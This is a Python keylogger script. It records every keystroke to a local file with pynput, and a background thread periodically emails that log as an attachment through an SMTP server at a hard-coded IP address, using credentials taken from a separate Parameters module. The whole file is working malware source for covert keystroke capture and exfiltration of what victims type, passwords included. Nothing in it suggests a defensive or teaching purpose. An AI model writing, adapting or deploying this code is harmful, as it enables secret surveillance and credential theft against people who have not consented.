from pynput.keyboard import Listener
import smtplib as smtp
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import time
from threading import Thread
import Parameters


def PressKey(key):
    print(key)
    global file
    key = str(key)

    file = open("mail.txt", "a")
    file.writelines(key)
    file.writelines("\n")
    file.close()

def ClearFile():
    global file
    file = open("mail.txt", "w")
    file.write("")
    file.close()


def SendInput():

    subject = "keylogger"

    message = MIMEMultipart("plain")
    message["From"] = Parameters.MailDirection
    message["To"] = Parameters.Mailaddressee
    message["Subject"] = subject
    Adjunt = MIMEBase("application", "octect-stream")
    Adjunt.set_payload(open("mail.txt", "rb").read())
    message.attach(Adjunt)

    server = smtp.SMTP('64.233.184.108')
    server.starttls()
    server.login(Parameters.MailDirection, Parameters.MailPasword)
    server.sendmail(Parameters.MailDirection, Parameters.Mailaddressee, message.as_string())

    print("The Mail Has Been Send")

    server.quit()


def CounterAndSend():

    while (True):

        ClearFile()

        time.sleep(Parameters.Time)

        SendInput()


Thread1 = Thread(name="Thread_1", target=CounterAndSend)
Thread1.start()

with Listener(on_press=PressKey) as l:
    l.join()






